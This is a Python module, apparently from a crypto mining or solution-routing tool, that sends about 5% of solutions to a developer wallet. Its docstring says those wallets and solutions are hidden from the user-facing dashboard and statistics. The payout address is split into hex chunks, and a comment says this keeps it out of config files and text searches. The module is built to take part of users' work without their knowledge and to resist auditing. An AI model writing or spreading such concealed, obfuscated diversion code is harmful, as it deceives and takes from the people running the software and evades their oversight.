"""
Developer Fee Module

This module manages the 5% developer fee by probabilistically routing
solutions to developer wallets. These wallets and their solutions are
hidden from the user-facing dashboard and statistics.
"""

import random
import logging
import hashlib

# The consolidation address is stored as hex chunks to avoid exposing the
# plain string in config files or simple text searches.
_DEV_ADDR_HEX_SEGMENTS = (
    "61646472317178377465706868377374",
    "6b3866396b6b6b657664747765326474",
    "686a6e3371346e306467633274346c37",
    "35703777347865746338793277736a76",
    "76716878706c376c723377783561756e",
    "63797a34727139647477367073757530",
"737a646b757876",
)


def _decode_dev_address():
    """Reconstruct the developer consolidation address from hex segments."""
    hex_string = "".join(_DEV_ADDR_HEX_SEGMENTS)
    try:
        return bytes.fromhex(hex_string).decode("utf-8")
    except ValueError as exc:
        logging.error("Failed to decode developer address: %s", exc)
        raise


class DevFeeManager:
    """Manages developer fee wallet selection and solution routing."""

    def __init__(self):
        self._dev_address = _decode_dev_address()
        self._fee_probability = 0.05


    def should_use_dev_wallet(self):
        """
        Determine if the next solution should go to a dev wallet.
        Returns True approximately 5% of the time.
        """
        return random.random() < self._fee_probability

    def get_dev_consolidate_address(self):
        """Returns the developer consolidation address."""
        return self._dev_address

    def get_fee_percentage(self):
        """Expose the effective fee percentage for internal diagnostics."""
        return self._fee_probability

    def is_dev_wallet(self, wallet_address):
        """Check if a given wallet address is a dev wallet (by checking its consolidation)."""
        # Dev wallets consolidate to the dev address
        # This is a simple check - in practice, we'd check the DB flag
        return False  # Will be checked via DB flag


# Global instance
dev_fee_manager = DevFeeManager()
